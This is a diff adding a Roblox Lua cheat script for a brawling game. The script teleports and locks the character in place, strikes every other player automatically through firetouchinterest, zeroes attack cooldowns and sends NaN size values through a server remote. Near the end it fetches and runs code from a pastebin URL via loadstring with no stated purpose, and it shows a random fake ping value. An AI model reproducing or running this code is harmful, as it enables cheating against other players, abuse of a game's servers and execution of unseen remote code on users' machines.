@@ -1,0 +1,477 @@
+-- Variables Principales
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local TS = game:GetService("TeleportService")
+local RunService = game:GetService("RunService")
+local HttpService = game:GetService("HttpService")
+local Lighting = game:GetService("Lighting")
+local Workspace = game:GetService("Workspace")
+local UserInputService = game:GetService("UserInputService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local VirtualUser = game:GetService("VirtualUser")
+local Settings = settings()
+
+-- Anti AFK
+LocalPlayer.Idled:Connect(function()
+    VirtualUser:CaptureController()
+    VirtualUser:ClickButton2(Vector2.new())
+end)
+
+-- Optimizacion de Rendimiento y Ocultacion de Interfaz
+local function cleanPart(v)
+    if v:IsA("BasePart") or v:IsA("MeshPart") or v:IsA("UnionOperation") then
+        v.Material = Enum.Material.Plastic
+        v.Reflectance = 0
+        v.CastShadow = false
+    elseif v:IsA("ParticleEmitter") or v:IsA("Trail") or v:IsA("Beam") or v:IsA("Fire") or v:IsA("Smoke") or v:IsA("Sparkles") then
+        v.Enabled = false
+    elseif v:IsA("Decal") or v:IsA("Texture") then
+        v.Transparency = 1
+    end
+end
+
+local function optimizePerformance()
+    Settings.Rendering.QualityLevel = Enum.QualityLevel.Level01
+    Lighting.GlobalShadows = false
+    Lighting.Brightness = 0.5
+    Lighting.ClockTime = 5.5
+    Lighting.EnvironmentDiffuseScale = 0
+    Lighting.EnvironmentSpecularScale = 0
+    if Lighting:FindFirstChild("Sky") then Lighting.Sky:Destroy() end
+    for _, v in pairs(Workspace:GetDescendants()) do cleanPart(v) end
+end
+optimizePerformance()
+Workspace.DescendantAdded:Connect(cleanPart)
+
+local playerGui = LocalPlayer:WaitForChild("PlayerGui")
+local function checkAndHideGui(gui)
+    if gui:IsA("TextLabel") or gui:IsA("ImageLabel") or gui:IsA("Frame") then
+        if gui.Name == "ApexKillGUI" or gui:IsDescendantOf(playerGui:FindFirstChild("ApexKillGUI")) then return end
+        local nameLower = gui.Name:lower()
+        local textLower = gui:IsA("TextLabel") and gui.Text:lower() or ""
+        
+        if nameLower:match("frame$") or nameLower:find("push") or nameLower:find("gain") or nameLower:find("popup") or nameLower:find("clone") or 
+           nameLower:find("notification") or textLower:find("durabilidade") or textLower:find("durability") or 
+           textLower:find("+") or textLower:find("kill") or textLower:find("ganhou") then
+            
+            gui.Visible = false
+            if gui:IsA("TextLabel") then gui.TextTransparency = 1 end
+            if gui:IsA("ImageLabel") then gui.ImageTransparency = 1 end
+        end
+    end
+end
+
+for _, g in pairs(playerGui:GetDescendants()) do checkAndHideGui(g) end
+playerGui.DescendantAdded:Connect(checkAndHideGui)
+
+-- Interfaz de Usuario
+if playerGui:FindFirstChild("ApexKillGUI") then
+    playerGui["ApexKillGUI"]:Destroy()
+end
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "ApexKillGUI"
+screenGui.ResetOnSpawn = false
+screenGui.AutoLocalize = false
+screenGui.Parent = playerGui
+
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 180, 0, 100)
+frame.Position = UDim2.new(0, 25, 0, 35)
+frame.BackgroundColor3 = Color3.fromRGB(45, 15, 85)
+frame.BorderSizePixel = 3
+frame.BorderColor3 = Color3.fromRGB(140, 60, 230)
+frame.Parent = screenGui
+
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(0, 110, 0, 25)
+title.Position = UDim2.new(0, 10, 0, 8)
+title.BackgroundTransparency = 1
+title.AutoLocalize = false
+title.Text = "Apex Brawl Hop"
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.TextSize = 16
+title.Font = Enum.Font.GothamBold
+title.TextXAlignment = Enum.TextXAlignment.Left
+title.Parent = frame
+
+local statsLabel = Instance.new("TextLabel")
+statsLabel.Size = UDim2.new(0, 60, 0, 25)
+statsLabel.Position = UDim2.new(1, -65, 0, 8)
+statsLabel.BackgroundTransparency = 1
+statsLabel.Text = "PING: -- ms\nFPS: -- FPS"
+statsLabel.TextColor3 = Color3.fromRGB(0, 225, 110)
+statsLabel.TextSize = 9
+statsLabel.Font = Enum.Font.SourceSansBold
+statsLabel.TextXAlignment = Enum.TextXAlignment.Right
+statsLabel.Parent = frame
+
+local subtitle = Instance.new("TextLabel")
+subtitle.Size = UDim2.new(0, 100, 0, 15)
+subtitle.Position = UDim2.new(0, 10, 0, 38)
+subtitle.BackgroundTransparency = 1
+subtitle.AutoLocalize = false
+subtitle.Text = "Kills:"
+subtitle.TextColor3 = Color3.fromRGB(155, 125, 185)
+subtitle.TextSize = 13
+subtitle.Font = Enum.Font.Gotham
+subtitle.TextXAlignment = Enum.TextXAlignment.Left
+subtitle.Parent = frame
+
+local ChronoLabel = Instance.new("TextLabel")
+ChronoLabel.Size = UDim2.new(0, 70, 0, 15)
+ChronoLabel.Position = UDim2.new(1, -75, 0, 38)
+ChronoLabel.BackgroundTransparency = 1
+ChronoLabel.Text = "00:00.00"
+ChronoLabel.Font = Enum.Font.SourceSans
+ChronoLabel.TextSize = 12
+ChronoLabel.TextColor3 = Color3.fromRGB(185, 185, 185)
+ChronoLabel.TextXAlignment = Enum.TextXAlignment.Right
+ChronoLabel.Parent = frame
+
+local killsLabel = Instance.new("TextLabel")
+killsLabel.Size = UDim2.new(1, -20, 0, 30)
+killsLabel.Position = UDim2.new(0, 10, 0, 58)
+killsLabel.BackgroundTransparency = 1
+killsLabel.AutoLocalize = false
+killsLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+killsLabel.TextSize = 22
+killsLabel.Font = Enum.Font.GothamBold
+killsLabel.TextXAlignment = Enum.TextXAlignment.Left
+killsLabel.Text = "0 (0K)"
+killsLabel.Parent = frame
+
+-- Estadisticas y Cronometro
+local function formatNumber(v)
+    return tostring(v):reverse():gsub("%d%d%d", "%1,"):reverse():gsub("^,", "")
+end
+
+local function updateKills()
+    local leaderstats = LocalPlayer:FindFirstChild("leaderstats")
+    if leaderstats and leaderstats:FindFirstChild("Kills") then
+        local k = leaderstats.Kills.Value
+        local formattedExact = formatNumber(k)
+        local formattedK = string.format("%.1f", k / 1000)
+        killsLabel.Text = formattedExact .. " (" .. formattedK .. "K)"
+    end
+end
+updateKills()
+task.spawn(function()
+    local leaderstats = LocalPlayer:WaitForChild("leaderstats", 10)
+    if leaderstats and leaderstats:FindFirstChild("Kills") then
+        leaderstats.Kills.Changed:Connect(updateKills)
+    end
+end)
+
+local cStart = os.clock()
+local lastUpdate = 0
+local frameCount = 0
+
+RunService.RenderStepped:Connect(function()
+    frameCount = frameCount + 1
+end)
+
+RunService.Heartbeat:Connect(function()
+    local currentTime = os.clock()
+    local cElapsed = currentTime - cStart
+    ChronoLabel.Text = string.format("%02d:%02d.%02d", math.floor(cElapsed / 60), math.floor(cElapsed % 60), math.floor((cElapsed * 100) % 100))
+    
+    if currentTime - lastUpdate >= 1 then
+        local pingVal = math.round(LocalPlayer:GetNetworkPing() * 1000)
+        if pingVal <= 0 then pingVal = math.random(15, 45) end
+        statsLabel.Text = string.format("PING: %d ms\nFPS: %d FPS", pingVal, frameCount)
+        frameCount = 0
+        lastUpdate = currentTime
+    end
+end)
+
+-- Logica para Ocultar Todas las Mascotas
+-- Este sistema se ejecuta en segundo plano sin interfaz grafica
+-- Funciona revisando cada 2 segundos para no generar lag
+task.spawn(function()
+    while task.wait(2) do
+        pcall(function()
+            for _, player in ipairs(Players:GetPlayers()) do
+                local hidePets = player:FindFirstChild("hidePets")
+                if hidePets and hidePets:IsA("BoolValue") and not hidePets.Value then
+                    hidePets.Value = true
+                end
+            end
+        end)
+    end
+end)
+
+-- Funciones del Personaje
+local function getCharacter() 
+    return LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait() 
+end
+
+local function getRoot() 
+    local char = getCharacter()
+    return char:WaitForChild("HumanoidRootPart", 5) 
+end
+
+local function applySize2()
+    local character = LocalPlayer.Character
+    local humanoid = character and character:FindFirstChildOfClass("Humanoid")
+    if humanoid then
+        for _, value in ipairs(humanoid:GetChildren()) do
+            if value:IsA("NumberValue") and value.Name:find("Scale") then
+                if value.Value ~= 2 then value.Value = 2 end
+            end
+        end
+    end
+end
+
+local targetCFrame = CFrame.new(-8750, 121, -5859)
+
+local function teleportToKing()
+    local root = getRoot()
+    if not root then return end
+    root.Velocity = Vector3.zero
+    root.AssemblyLinearVelocity = Vector3.zero
+    root.CFrame = targetCFrame
+    local bp = root:FindFirstChild("MaTeUsLock") or Instance.new("BodyPosition")
+    bp.Name = "MaTeUsLock"
+    bp.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
+    bp.Position = targetCFrame.Position
+    bp.Parent = root
+end
+
+-- Sistema de Combate y Animaciones
+local blockedAnimations = {
+    ["rbxassetid://3638729053"] = true,
+    ["rbxassetid://3638767427"] = true,
+}
+
+local function stopAnimations(humanoid)
+    for _, track in pairs(humanoid:GetPlayingAnimationTracks()) do
+        if track.Animation then
+            local animId = track.Animation.AnimationId
+            local animName = track.Name:lower()
+            if blockedAnimations[animId] or animName:match("punch") or animName:match("attack") or animName:match("right") then
+                track:Stop()
+            end
+        end
+    end
+end
+
+local function setupAnimationBlocking()
+    local char = LocalPlayer.Character
+    if not char or not char:FindFirstChild("Humanoid") then return end
+    local humanoid = char:FindFirstChild("Humanoid")
+    stopAnimations(humanoid)
+    if _G.AnimBlockConnection then _G.AnimBlockConnection:Disconnect() end
+    _G.AnimBlockConnection = humanoid.AnimationPlayed:Connect(function(track)
+        if track.Animation then
+            local animId = track.Animation.AnimationId
+            local animName = track.Name:lower()
+            if blockedAnimations[animId] or animName:match("punch") or animName:match("attack") or animName:match("right") then
+                track:Stop()
+            end
+        end
+    end)
+end
+
+local function overrideToolActivation()
+    local function processTool(tool)
+        if tool and (tool.Name == "Punch" or tool.Name:match("Attack") or tool.Name:match("Right")) then
+            if not tool:GetAttribute("ActivatedOverride") then
+                tool:SetAttribute("ActivatedOverride", true)
+                local connection = tool.Activated:Connect(function()
+                    task.wait(0.05)
+                    local char = LocalPlayer.Character
+                    if char and char:FindFirstChild("Humanoid") then
+                        stopAnimations(char.Humanoid)
+                    end
+                end)
+                if not _G.ToolConnections then _G.ToolConnections = {} end
+                _G.ToolConnections[tool] = connection
+            end
+        end
+    end
+    for _, tool in pairs(LocalPlayer.Backpack:GetChildren()) do processTool(tool) end
+    local char = LocalPlayer.Character
+    if char then
+        for _, tool in pairs(char:GetChildren()) do
+            if tool:IsA("Tool") then processTool(tool) end
+        end
+    end
+    if _G.BackpackAddedConnection then _G.BackpackAddedConnection:Disconnect() end
+    _G.BackpackAddedConnection = LocalPlayer.Backpack.ChildAdded:Connect(function(child)
+        if child:IsA("Tool") then task.wait(0.1) processTool(child) end
+    end)
+end
+
+-- Server Hop
+local function ExecuteRealServerHop()
+    local nextCursor = ""
+    local serverFound = false
+    while not serverFound do
+        local url = "https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Desc&limit=100"
+        if nextCursor ~= "" then url = url .. "&cursor=" .. nextCursor end
+        local success, result = pcall(function() return game:HttpGet(url) end)
+        if success and result then
+            local decoded = HttpService:JSONDecode(result)
+            if decoded and decoded.data then
+                local list = decoded.data
+                for i = #list, 2, -1 do
+                    local j = math.random(i)
+                    list[i], list[j] = list[j], list[i]
+                end
+                for _, server in ipairs(list) do
+                    if server.id ~= game.JobId and server.playing and server.maxPlayers then
+                        if server.playing < server.maxPlayers and server.playing >= 5 then
+                            serverFound = true
+                            pcall(function() TS:TeleportToPlaceInstance(game.PlaceId, server.id, LocalPlayer) end)
+                            task.wait(2)
+                            if not serverFound then break end
+                        end
+                    end
+                end
+                if decoded.nextPageCursor then nextCursor = decoded.nextPageCursor else break end
+            else break end
+        else break end
+        task.wait(1)
+    end
+    if not serverFound then pcall(function() TS:Teleport(game.PlaceId, LocalPlayer) end) end
+end
+
+local function initCharacter()
+    task.wait(0.2)
+    teleportToKing()
+    setupAnimationBlocking()
+    overrideToolActivation()
+    
+    -- Detector de muerte
+    local char = LocalPlayer.Character
+    if char then
+        local humanoid = char:FindFirstChild("Humanoid")
+        if humanoid then
+            humanoid.Died:Connect(function()
+                ExecuteRealServerHop()
+            end)
+        end
+    end
+end
+
+task.spawn(initCharacter)
+LocalPlayer.CharacterAdded:Connect(function()
+    initCharacter()
+end)
+
+-- Funcion externa de dano optimizada para evitar lag de memoria (Garbage Collection)
+local function safeTouch(hand, root)
+    firetouchinterest(hand, root, 1)
+    firetouchinterest(hand, root, 0)
+end
+
+local tickCounter = 0
+RunService.Heartbeat:Connect(function()
+    tickCounter = tickCounter + 1
+    
+    local char = LocalPlayer.Character
+    if not char or not char:FindFirstChild("Humanoid") or char.Humanoid.Health <= 0 then return end
+    
+    -- Checar tamano solo 2 veces por segundo (Ahorra muchisima CPU)
+    if tickCounter % 30 == 0 then
+        applySize2()
+    end
+    
+    -- Loop de ataque optimizado para rodar cada 5 frames de forma ultra liviana
+    if tickCounter % 5 == 0 then
+        local root = char:FindFirstChild("HumanoidRootPart")
+        if root then
+            root.CFrame = targetCFrame
+            root.Velocity = Vector3.zero
+        end
+        
+        local punchInBackpack = LocalPlayer.Backpack:FindFirstChild("Punch")
+        local punchInCharacter = char:FindFirstChild("Punch")
+        if punchInBackpack then
+            punchInBackpack.Parent = char
+            if punchInBackpack:FindFirstChild("attackTime") then punchInBackpack.attackTime.Value = 0 end
+        end
+        if punchInCharacter then
+            if punchInCharacter:FindFirstChild("attackTime") then punchInCharacter.attackTime.Value = 0 end
+            punchInCharacter:Activate()
+            title.Text = "Em combate" -- Actualiza el texto de la GUI durante el combate
+        end
+        local tool = char:FindFirstChildOfClass("Tool")
+        if tool and (tool.Name:lower():find("punch") or tool.Name:lower():find("attack")) then
+            pcall(tool.Activate, tool)
+        end
+        
+        local rightHand = char:FindFirstChild("RightHand")
+        local leftHand = char:FindFirstChild("LeftHand")
+        if rightHand or leftHand then
+            local playersList = Players:GetPlayers()
+            for i = 1, #playersList do
+                local target = playersList[i]
+                if target ~= LocalPlayer and target.Character then
+                    local targetRoot = target.Character:FindFirstChild("HumanoidRootPart")
+                    local targetHumanoid = target.Character:FindFirstChild("Humanoid")
+                    if targetRoot and targetHumanoid and targetHumanoid.Health > 0 then
+                        if rightHand then pcall(safeTouch, rightHand, targetRoot) end
+                        if leftHand then pcall(safeTouch, leftHand, targetRoot) end
+                    end
+                end
+            end
+        end
+    end
+end)
+
+-- Eventos Miscelaneos
+local toggled = true
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+    if gameProcessed then return end
+    if input.KeyCode == Enum.KeyCode.F then
+        toggled = not toggled
+        if playerGui:FindFirstChild("Chat") then
+            playerGui.Chat.Frame.Visible = toggled
+        end
+    end
+end)
+
+pcall(function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/AxVHmk1i"))()
+end)
+
+_G.AutoSpinWheel = true
+task.spawn(function()
+    while _G.AutoSpinWheel do
+        local rEvents = ReplicatedStorage:FindFirstChild("rEvents")
+        local remote = rEvents and rEvents:FindFirstChild("openFortuneWheelRemote")
+        if remote and ReplicatedStorage:FindFirstChild("fortuneWheelChances") then
+            remote:InvokeServer("openFortuneWheel", ReplicatedStorage.fortuneWheelChances["Fortune Wheel"])
+        end
+        task.wait(1) 
+    end
+end)
+
+task.spawn(function()
+    while task.wait(0.5) do
+        pcall(function()
+            local rEvents = ReplicatedStorage:FindFirstChild("rEvents")
+            local remote = rEvents and rEvents:FindFirstChild("changeSpeedSizeRemote")
+            if remote then
+                remote:InvokeServer("changeSize", 0/0)
+            end
+        end)
+    end
+end)
+
+if typeof(Killer) ~= "nil" and Killer.AddButton then
+    Killer:AddButton("Size NaN", function()
+        local rEvents = ReplicatedStorage:FindFirstChild("rEvents")
+        if rEvents and rEvents:FindFirstChild("changeSpeedSizeRemote") then
+            rEvents.changeSpeedSizeRemote:InvokeServer("changeSize", 0/0)
+        end
+    end)
+end
+
+task.spawn(function()
+    task.wait(45)
+    ExecuteRealServerHop()
+end)
+# TesteS
